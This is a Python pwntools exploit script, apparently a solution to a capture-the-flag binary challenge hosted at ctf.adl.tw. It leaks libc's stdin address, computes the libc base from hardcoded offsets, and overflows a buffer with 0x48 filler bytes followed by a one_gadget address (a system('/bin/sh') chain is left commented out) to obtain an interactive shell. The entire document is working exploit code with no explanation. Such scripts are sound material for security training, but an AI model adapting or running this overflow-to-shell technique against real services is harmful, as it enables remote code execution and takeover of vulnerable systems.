from pwn import *

r = remote("ctf.adl.tw", 11004)
# r = process("./nopie")

stdin_raw = r.recvuntil("=")[:-1]
print(stdin_raw)
stdin_addr = (int.from_bytes(stdin_raw, byteorder='little'))
print('stdin addr:', hex(stdin_addr))

libc = ELF('./libc.so.6')

libc_stdin_offset = 0x03eba00
# libc_stdin_offset = 0x01eb980
libc_system_offset = 0x04f440
# libc_system_offset = 0x055410
libc_binsh_offset = 0x01b3e9b
# libc_binsh_offset = 0x1b75ab
one_gadget_off = 0x4f2c5

base_addr = stdin_addr - libc_stdin_offset
print('base addr:', hex(base_addr))

system_addr = libc_system_offset + base_addr
print('system() addr:', hex(system_addr))

binsh_addr = libc_binsh_offset + base_addr
print('bin/sh addr:', hex(binsh_addr))

# payload = b'A' * 0x48 + p64(system_addr) + p64(123) + p64(binsh_addr)
payload = b'A'*0x48 + p64(one_gadget_off+base_addr)
r.sendline(payload)
r.interactive()
